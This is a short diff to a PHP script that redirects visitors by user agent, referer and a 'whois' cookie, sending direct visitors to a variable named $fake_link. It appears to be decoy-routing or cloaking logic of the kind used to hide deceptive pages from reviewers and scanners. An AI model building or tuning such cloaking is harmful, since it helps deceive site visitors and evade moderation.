@@ -1,7 +1,6 @@
 <?php
 $useragent=$_SERVER['HTTP_USER_AGENT'];
 $cookie_name = "whois";
-$cookie_value = "true";
 $host = $_SERVER["HTTP_HOST"];
 $uri = $_SERVER["REQUEST_URI"];
 $http_referer = $_SERVER["HTTP_REFERER"];
@@ -26,15 +25,16 @@ if(preg_match('/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|c
 
 }else{
     if(!isset($http_referer)){
-        if(isset($_COOKIE[$cookie_name])){
+        if($_COOKIE[$cookie_name]=="true"){
             redirect($html_page_name);
         }else{
             redirect($fake_link);
+        setcookie($cookie_name, "false", time() + (86400 * 30), "/");
+
         }
     }else{
-        setcookie($cookie_name, $cookie_value, time() + (86400 * 30), "/");
+        setcookie($cookie_name, "true", time() + (86400 * 30), "/");
         redirect($html_page_name);
-    
     }
     
 }
